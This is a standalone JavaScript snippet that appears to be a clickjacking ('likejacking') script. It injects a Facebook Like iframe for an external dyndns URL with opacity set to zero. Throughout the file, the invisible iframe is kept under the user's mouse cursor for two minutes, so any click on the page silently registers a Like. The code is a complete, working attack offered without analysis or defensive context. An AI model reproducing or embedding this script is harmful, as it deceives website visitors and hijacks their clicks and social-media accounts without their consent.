var opacity = 0;
var time = 120000;

if ((document.getElementById) && window.addEventListener || window.attachEvent) { (function () {
		var b = "#ff0000";
		var d = document;
		var c = -10;
		var f = -10;
		var r;
		var g = "";
		var h = document.getElementsByTagName('div').length;
		var i = "<iframe id='theiframe' scrolling='no' frameBorder='0' allowTransparency='true' src='http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fjimmykane.dyndns-server.com%2F'&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80' style='cursor: default;position:absolute;width:53px;height:23px;overflow:hidden;border:0;opacity:" + opacity + ";filter:alpha(opacity=" + (opacity * 100) + ");'></iframe>";
		document.write(i);
		var j = document.getElementById("theiframe");
		document.getElementsByTagName('body')[0].appendChild(j);
		var k = "px";
		var l = (typeof window.innerWidth == "number");
		var m = (typeof window.pageYOffset == "number");
		if (l) r = window;
		else {
			if (d.documentElement && typeof d.documentElement.clientWidth == "number" && d.documentElement.clientWidth != 0) r = d.documentElement;
			else {
				if (d.body && typeof d.body.clientWidth == "number") r = d.body
			}
		}
		if (time != 0) {
			setTimeout(function () {
				document.getElementsByTagName('body')[0].removeChild(j);
				if (window.addEventListener) {
					document.removeEventListener("mousemove", mouse, false)
				} else if (window.attachEvent) {
					document.detachEvent("onmousemove", mouse)
				}
			},
			time)
		}
		function scrl(a) {
			var y, x;
			if (m) {
				y = r.pageYOffset;
				x = r.pageXOffset
			} else {
				y = r.scrollTop;
				x = r.scrollLeft
			}
			return (a == 0) ? y: x
		}
		function mouse(e) {
			var a = (m) ? window.pageYOffset: 0;
			if (!e) e = window.event;
			if (typeof e.pageY == 'number') {
				c = e.pageY - 5 - a;
				f = e.pageX - 4
			} else {
				c = e.clientY - 6 - a;
				f = e.clientX - 6
			}
			g.top = c + scrl(0) + k;
			g.left = f + k
		}
		function ani() {
			g.top = c + scrl(0) + k;
			setTimeout(ani, 300)
		}
		function init() {
			g = document.getElementById("theiframe").style;
			ani()
		}
		if (window.addEventListener) {
			window.addEventListener("load", init, false);
			document.addEventListener("mousemove", mouse, false)
		} else if (window.attachEvent) {
			window.attachEvent("onload", init);
			document.attachEvent("onmousemove", mouse)
		}
	})()
}